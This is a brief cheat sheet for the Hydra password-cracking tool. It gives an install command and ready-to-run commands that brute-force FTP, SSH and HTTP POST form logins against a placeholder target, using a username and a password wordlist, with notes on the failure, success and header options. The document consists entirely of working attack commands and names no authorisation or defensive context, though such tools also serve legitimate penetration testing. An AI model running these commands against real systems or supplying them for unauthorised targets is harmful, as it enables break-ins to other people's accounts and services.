# Hydra (Parallelized login cracker)

```bash
# Install hydra tool
sudo apt install hydra

# Cracking FTP service
hydra -t 10 -l USER -P wordlist.txt -vV TARGETHOST ftp

# Cracking SSH service
hydra -t 10 -l USER -P wordlist.txt -vV TARGETHOST ssh

# Cracking HTTP POST body json based
#F=String when attempt fail
#S=String when attempt was succeed
#H=Extra headers if needed
hydra -t 10 -l USER -P wordlist.txt -vV TARGETHOST http-post-form \
"/path/to/the/api:username=^USER^&password=^PASS^:F=StringWhenFailed:H=Accept: application/json"
```